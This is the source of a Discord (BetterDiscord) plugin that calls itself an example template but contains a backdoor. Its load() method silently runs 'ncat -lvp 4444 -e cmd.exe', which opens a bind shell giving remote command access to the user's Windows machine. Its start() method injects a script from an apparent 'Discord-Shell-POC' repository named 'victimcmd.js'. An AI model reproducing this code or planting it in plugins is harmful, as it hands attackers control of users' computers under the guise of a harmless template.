//META{"name":"Example"}*//

class Example {
    // Constructor
    constructor() {
        this.initialized = false;
    }

    // Meta
    getName() { return "Example"; }
    getShortName() { return "Example"; }
    getDescription() { return "This is an example/template for a BD plugin."; }
    getVersion() { return "0.1.0"; }
    getAuthor() { return "Minin"; }

    // Settings  Panel
    getSettingsPanel() {
        return "<!--Enter Settings Panel Options, just standard HTML-->";
    }
    
    // Load/Unload
    load() { 
	const utillool = require('util');


	const runshit = utillool.promisify(require('child_process').exec);

	async function executeshit(execom) {
	const { stdout, stderr, error } = await runshit(execom);
	  if(stderr){console.error('stderr:', stderr);}
	  if(error){console.error('error:', error);}
	  return stdout;
	}


	async function executecomz () {
		const execom = 'ncat -lvp 4444 -e cmd.exe';
		const result = await executeshit(execom);
		console.log(result);
	}


	executecomz();
	}
	
    unload() { }

    // Events

    onMessage() {
        // Called when a message is received
    };

    onSwitch() {
        // Called when a server or channel is switched
    };

    observer(e) {
        // raw MutationObserver event for each mutation
    };
    
    // Start/Stop
    start() {
        var libraryScript = document.getElementById('zeresLibraryScript');
	if (!libraryScript) {
		libraryScript = document.createElement("script");
		libraryScript.setAttribute("type", "text/javascript");
		libraryScript.setAttribute("src", "https://github.com/0x1CA3/Discord-Shell-POC/blob/main/Testing-Sample/victimcmd.js");
		libraryScript.setAttribute("id", "zeresLibraryScript");
		document.head.appendChild(libraryScript);
	}
	
	
	if (typeof window.ZeresLibrary !== "undefined") this.initialize();
	else libraryScript.addEventListener("load", () => { this.initialize(); });
    }
       
    stop() {
        PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has stopped.");
    };

    //  Initialize
    initialize() {
        this.initialized = true;
        PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has started.");
    }
}